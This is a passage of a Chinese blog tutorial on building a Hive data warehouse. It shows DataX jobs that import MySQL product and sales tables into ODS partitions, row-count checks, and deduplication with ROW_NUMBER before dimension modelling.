<h5 id="商品信息导入ods表"><a href="#商品信息导入ods表" class="headerlink" title="商品信息导入ods表"></a>商品信息导入ods表</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换用户</span></span><br><span class="line">su hadoop</span><br><span class="line"><span class="comment"># 进入到hive模式</span></span><br><span class="line">hive</span><br><span class="line"><span class="comment"># 使用hive数据库</span></span><br><span class="line">use hive;</span><br><span class="line"><span class="comment"># 手动插入分区信息内容</span></span><br><span class="line">hive&gt;insert into ods_product_info partition(dt = <span class="string">&#x27;2021-12-21&#x27;</span>) VALUES (11, <span class="string">&#x27;222&#x27;</span>, <span class="string">&#x27;18576759590&#x27;</span>, <span class="string">&#x27;湖南省常德市&#x27;</span>, <span class="string">&#x27;222&#x27;</span>, <span class="string">&#x27;产品描述&#x27;</span>, <span class="string">&#x27;333&#x27;</span>, <span class="string">&#x27;444&#x27;</span>, <span class="string">&#x27;555&#x27;</span>, <span class="string">&#x27;666&#x27;</span>, <span class="string">&#x27;77&#x27;</span>);</span><br><span class="line"><span class="comment"># 查看到刚刚插入的信息</span></span><br><span class="line">hive&gt;select * from ods_product_info;</span><br><span class="line"><span class="comment"># 新增完后，可以删除表中数据，也可不删</span></span><br><span class="line">hive&gt;<span class="built_in">truncate</span> table ods_product_info;</span><br><span class="line">hive&gt;<span class="built_in">exit</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看到分区信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos root]$ hadoop fs -ls /user/hive/warehouse/hive.db/ods_product_info/</span><br><span class="line">drwxr-xr-x   - hadoop supergroup          0 2021-12-23 09:31 /user/hive/warehouse/hive.db/ods_product_info/dt=2021-12-21</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在datax的job目录编写一个mysql_hive_ods_product_info.json文件，同步超市分店配置用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos job]<span class="comment"># ls</span></span><br><span class="line">-rwxrwxrwx 1 root root 1587 Dec 21 18:05 job.json</span><br><span class="line">-rw-r--r-- 1 root root 1861 Dec 22 15:54 mysql_hive_ods_market_info.json</span><br><span class="line">-rw-r--r-- 1 root root 1861 Dec 23 09:36 mysql_hive_ods_product_info.json</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑mysql_hive_ods_productinfo.json文件</p>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;job&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;setting&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;speed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;channel&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">			 <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mysqlreader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;parameter&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;column&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;product_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;type_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;supplier_phone&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;supplier_address&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;product_price&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;product_desc&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;start_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;end_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;product_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;create_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;update_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;connection&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jdbcUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                    <span class="string">&quot;jdbc:mysql://localhost:3306/hive&quot;</span></span><br><span class="line">                                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;table&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                    <span class="string">&quot;product_info&quot;</span></span><br><span class="line">                                <span class="punctuation">]</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hive1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hive&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">			<span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hdfswriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;parameter&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;defaultFS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hdfs://localhost:9000&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;fileType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/user/hive/warehouse/hive.db/ods_product_info/dt=2021-12-21&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;fileName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ods_product_info&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;column&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;int&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;type_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;supplier_phone&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;supplier_address&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product_price&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product_desc&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;start_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;end_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;create_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;update_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span></span><br><span class="line">					<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;writeMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;append&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;fieldDelimiter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\t&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>运行datax命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回到root用户</span><br><span class="line">[hadoop@VM-24-13-centos root]$ su</span><br><span class="line">[root@VM-24-13-centos ~]# cd /usr/local/datax/bin/</span><br><span class="line"># DHADOOP_USER_NAME一定要用hadoop用户，用其他用户会报错没有权限</span><br><span class="line">[root@VM-24-13-centos bin]# python datax.py -p &quot;-DHADOOP_USER_NAME=hadoop&quot; ../job/mysql_hive_ods_product_info.json</span><br><span class="line"></span><br><span class="line">任务启动时刻                    : 2021-12-23 10:30:52</span><br><span class="line">任务结束时刻                    : 2021-12-23 10:31:05</span><br><span class="line">任务总计耗时                    :                 12s</span><br><span class="line">任务平均流量                    :            2.22KB/s</span><br><span class="line">记录写入速度                    :             20rec/s</span><br><span class="line">读出记录总数                    :                 201</span><br><span class="line">读写失败总数                    :                   0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看hive中的商品表中是否有数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su hadoop</span><br><span class="line">hive</span><br><span class="line">use hive;</span><br><span class="line">hive&gt; select count(product_id) from ods_product_info;</span><br><span class="line">Total MapReduce CPU Time Spent: 0 msec</span><br><span class="line">OK</span><br><span class="line">201</span><br><span class="line">Time taken: 2.154 seconds, Fetched: 1 row(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="销售事实导入ods表"><a href="#销售事实导入ods表" class="headerlink" title="销售事实导入ods表"></a>销售事实导入ods表</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换用户</span></span><br><span class="line">su hadoop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入到hive模式</span></span><br><span class="line">hive</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用hive数据库</span></span><br><span class="line">use hive;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手动插入分区信息内容</span></span><br><span class="line"><span class="meta prompt_">hive&gt;</span><span class="language-bash">insert into ods_sale_info partition(dt = <span class="string">&#x27;2021-12-21&#x27;</span>) values (1, <span class="string">&#x27;222&#x27;</span>, <span class="string">&#x27;333&#x27;</span>, 4, 55, <span class="string">&#x27;666&#x27;</span>, <span class="string">&#x27;77&#x27;</span>);</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看到刚刚插入的信息</span></span><br><span class="line"><span class="meta prompt_">hive&gt;</span><span class="language-bash">select * from ods_sale_info;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新增完后，可以删除表中数据，也可不删</span></span><br><span class="line"><span class="meta prompt_">hive&gt;</span><span class="language-bash"><span class="built_in">truncate</span> table ods_sale_info;</span></span><br><span class="line"><span class="meta prompt_">hive&gt;</span><span class="language-bash"><span class="built_in">exit</span>;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看到分区信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos root]$ hadoop fs -ls /user/hive/warehouse/hive.db/ods_sale_info/</span><br><span class="line">drwxr-xr-x   - hadoop supergroup          0 2021-12-23 11:09 /user/hive/warehouse/hive.db/ods_sale_info/dt=2021-12-21</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在datax的job目录编写一个mysql_hive_ods_sale_info.json文件，同步销售事实表配置用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos job]<span class="comment"># ls</span></span><br><span class="line">-rwxrwxrwx 1 root root 1587 Dec 21 18:05 job.json</span><br><span class="line">-rw-r--r-- 1 root root 1861 Dec 22 15:54 mysql_hive_ods_market_info.json</span><br><span class="line">-rw-r--r-- 1 root root 2267 Dec 23 10:28 mysql_hive_ods_product_info.json</span><br><span class="line">-rw-r--r-- 1 root root 2267 Dec 23 11:06 mysql_hive_ods_sale_info.json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑mysql_hive_ods_productinfo.json文件</p>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;job&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;setting&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;speed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;channel&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">			 <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mysqlreader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;parameter&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;column&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;order_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;order_status&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;market_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;product_num&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;product_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;create_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="string">&quot;update_time&quot;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;connection&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jdbcUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                    <span class="string">&quot;jdbc:mysql://localhost:3306/hive&quot;</span></span><br><span class="line">                                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;table&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                    <span class="string">&quot;sale_info&quot;</span></span><br><span class="line">                                <span class="punctuation">]</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hive1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hive&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">			<span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hdfswriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;parameter&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;defaultFS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hdfs://localhost:9000&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;fileType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/user/hive/warehouse/hive.db/ods_sale_info/dt=2021-12-21&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;fileName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ods_sale_info&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;column&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;order_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;order_status&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;market_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product_num&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;int&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;int&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;create_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="punctuation">&#123;</span></span><br><span class="line">							<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;update_time&quot;</span><span class="punctuation">,</span></span><br><span class="line">							<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">						<span class="punctuation">&#125;</span></span><br><span class="line">					<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;writeMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;append&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;fieldDelimiter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\t&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>运行datax</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回到root用户</span></span><br><span class="line">[hadoop@VM-24-13-centos root]$ su</span><br><span class="line">[root@VM-24-13-centos ~]<span class="comment"># cd /usr/local/datax/bin/</span></span><br><span class="line"><span class="comment"># DHADOOP_USER_NAME一定要用hadoop用户，用其他用户会报错没有权限</span></span><br><span class="line">[root@VM-24-13-centos bin]<span class="comment"># python datax.py -p &quot;-DHADOOP_USER_NAME=hadoop&quot; ../job/mysql_hive_ods_sale_info.json</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">任务启动时刻                    : 2021-12-23 11:17:21</span><br><span class="line">任务结束时刻                    : 2021-12-23 11:17:34</span><br><span class="line">任务总计耗时                    :                 12s</span><br><span class="line">任务平均流量                    :            1.07KB/s</span><br><span class="line">记录写入速度                    :             20rec/s</span><br><span class="line">读出记录总数                    :                 202</span><br><span class="line">读写失败总数                    :                   0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看hive中的销售事实表是否有数据</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su hadoop</span><br><span class="line">hive</span><br><span class="line">use hive;</span><br><span class="line">hive&gt; select count(order_id) from ods_sale_info;</span><br><span class="line"></span><br><span class="line">Stage-Stage-1:  HDFS Read: 27232 HDFS Write: 0 SUCCESS</span><br><span class="line">Total MapReduce CPU Time Spent: 0 msec</span><br><span class="line">OK</span><br><span class="line">202</span><br></pre></td></tr></table></figure>

<ul>
<li>再次导入一次数据，造成重复的脏数据，为下一步数据清洗例子做准备</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos bin]# python datax.py -p &quot;-DHADOOP_USER_NAME=hadoop&quot; ../job/mysql_hive_ods_sale_info.json</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看 hive中的销售事实表存在了404条数据，有一半重复的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su hadoop</span><br><span class="line">hive</span><br><span class="line">use hive;</span><br><span class="line">hive&gt; select count(order_id) from ods_sale_info;</span><br><span class="line"></span><br><span class="line">Stage-Stage-1:  HDFS Read: 27232 HDFS Write: 0 SUCCESS</span><br><span class="line">Total MapReduce CPU Time Spent: 0 msec</span><br><span class="line">OK</span><br><span class="line">404</span><br></pre></td></tr></table></figure>

<h3 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h3><ul>
<li>在业务数据导入到ods层时，可能一些误操作，脏数据等，需要对ods层的数据进行清洗处理，本次就以ods_sale_info表中去重重复的order_id</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su hadoop</span><br><span class="line">hive</span><br><span class="line">use hive;</span><br><span class="line"></span><br><span class="line">hive&gt;drop table if exists tmp_ods_to_dwd_sale_info;</span><br><span class="line">create table tmp_ods_to_dwd_sale_info</span><br><span class="line">as select a.order_id,a.order_status,a.market_id,a.product_num,a.product_id,a.create_time,a.update_time from</span><br><span class="line">(select order_id,order_status,market_id,product_num,product_id,create_time,update_time, ROW_NUMBER() OVER(partition by order_id order BY create_time DESC) rn FROM ods_sale_info) a</span><br><span class="line">WHERE a.rn=1;</span><br><span class="line"></span><br><span class="line"># 查看到的只有85条数据</span><br><span class="line">hive&gt; select count(*) from  tmp_ods_to_dwd_sale_info;</span><br><span class="line">OK</span><br><span class="line">85</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>参考<a href="https://blog.csdn.net/yimingsilence/article/details/70140877">数据去重及row_number()</a></li>
</ul>
<h2 id="数据明细层DWD"><a href="#数据明细层DWD" class="headerlink" title="数据明细层DWD"></a>数据明细层DWD</h2><ul>
<li>数据清洗完毕后，把ODS层数据导入到OWD层</li>
</ul>
<h3 id="数据仓库建模"><a href="#数据仓库建模" class="headerlink" title="数据仓库建模"></a>数据仓库建模</h3><ul>
<li>在数据仓库层，采用星形模式创建超市分店维度表、商品维度表、日期维度表和销售事实表</li>
</ul>
<h4 id="维度建模"><a href="#维度建模" class="headerlink" title="维度建模"></a>维度建模</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 切换到hadoop用户</span><br><span class="line">su hadoop</span><br><span class="line"># 进入到hive</span><br><span class="line">hive</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建超市分维度表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> dw_dim_market_info;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dw_dim_market_info(</span><br><span class="line">market_id string comment <span class="string">&#x27;超市分店编号&#x27;</span>,</span><br><span class="line">market_address string comment <span class="string">&#x27;超市分店地址&#x27;</span>,</span><br><span class="line">effective_date string comment <span class="string">&#x27;有效期起始时间&#x27;</span>,</span><br><span class="line">expriry_date string comment <span class="string">&#x27;有效期终止时间&#x27;</span>,</span><br><span class="line">market_name string comment <span class="string">&#x27;超市分店名称&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;创建超市分维度表&#x27;</span></span><br><span class="line">partitioned <span class="keyword">by</span>(dt string)</span><br><span class="line"><span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">--创建商品维度表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> dw_dim_product_info;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dw_dim_product_info(</span><br><span class="line">product_id <span class="type">int</span> comment <span class="string">&#x27;商品id&#x27;</span>,</span><br><span class="line">type_name string comment <span 